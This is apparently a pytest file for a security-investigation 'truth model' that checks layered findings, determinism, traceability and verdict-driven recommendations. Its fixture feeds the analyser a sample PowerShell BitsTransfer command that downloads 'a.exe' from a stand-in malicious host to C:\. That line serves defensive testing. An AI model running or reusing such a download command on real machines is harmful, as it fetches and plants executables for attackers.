"""P1-02d · Investigation Truth Model tests.

Locks the invariants:
  1. Shape — cio.truth carries the six canonical layers.
  2. Determinism — same CIO twice → bit-identical truth.
  3. Traceability — every finding cites at least one node id that
     exists in cio.evidence_graph.nodes.
  4. Coverage — every non-Undetermined verdict yields a decision +
     ≥ 1 recommendation.
  5. Purity — build_truth never mutates the input CIO.
"""
from __future__ import annotations

import json
import copy

import pytest

from nivxforge.investigation.graph import EvidenceGraph, Node
from nivxforge.investigation.truth_model import build_truth
from nivxforge.investigation.verdict_engine import compute_verdict


def _mk_bits_cio():
    from smart_decoder import smart_decode
    from nivxforge.cim.fact_substrate import from_analysis_result
    from nivxforge.investigation import build_cio
    text = ("try{Import-Module BitsTransfer; Start-BitsTransfer -Source "
            "'http://evils.com/a.exe' -Destination C:\\a.exe;}catch{}")
    result = smart_decode(text) or {}
    fs = from_analysis_result(result, input_text=text,
                              source_endpoint="/tests/truth-model")
    return build_cio(fs)


def test_truth_has_six_layers():
    cio = _mk_bits_cio()
    t = cio.truth
    assert t is not None
    for key in ("observations", "findings", "hypotheses", "validations",
                "decision", "recommendations"):
        assert key in t, f"truth is missing {key}"


def test_truth_is_deterministic():
    cio = _mk_bits_cio()
    t1 = json.dumps(build_truth(cio).model_dump(mode="json"), sort_keys=True)
    t2 = json.dumps(build_truth(cio).model_dump(mode="json"), sort_keys=True)
    assert t1 == t2


def test_every_finding_traces_to_graph_node():
    cio = _mk_bits_cio()
    t = cio.truth
    node_ids = {n.id for n in cio.evidence_graph.nodes}
    for f in t["findings"]:
        # Must reference either an observation OR a node id.
        assert (f.get("source_observation_ids") or f.get("source_node_ids")), (
            f"finding {f.get('id')} has no traceability back to CIO"
        )
        for nid in f.get("source_node_ids") or []:
            assert nid in node_ids or nid.startswith("SYNTH-") or nid.startswith("META-"), (
                f"finding {f.get('id')} cites unknown node {nid}"
            )


def test_decision_present_when_verdict_present():
    cio = _mk_bits_cio()
    if cio.verdict and cio.verdict.get("label"):
        assert cio.truth["decision"] is not None
        assert cio.truth["decision"]["label"] == cio.verdict["label"]
        assert cio.truth["decision"]["confidence_pct"] == cio.verdict["confidence_pct"]


def test_recommendation_present_for_malicious():
    cio = _mk_bits_cio()
    if cio.verdict and cio.verdict.get("label") == "Malicious":
        recs = cio.truth["recommendations"]
        assert len(recs) >= 1
        actions = {r["action"] for r in recs}
        # Malicious should contain a `contain` action.
        assert "contain" in actions


def test_undetermined_stays_undetermined():
    """Empty graph → build_truth still returns a valid structure."""
    g = EvidenceGraph()
    g.add_node(Node(id="A", kind="artifact", label="input", confidence=1.0))
    # Fake a lightweight CIO stub with the fields build_truth reads.
    class _Stub:
        evidence_graph = g
        verdict = None
        metadata = {}
    t = build_truth(_Stub())
    assert t.decision is None
    assert t.hypotheses == []
    assert t.recommendations == []


def test_build_truth_is_pure():
    """build_truth must not mutate its input."""
    cio = _mk_bits_cio()
    before = json.dumps(cio.model_dump(mode="json"), sort_keys=True)
    _ = build_truth(cio)
    after = json.dumps(cio.model_dump(mode="json"), sort_keys=True)
    assert before == after
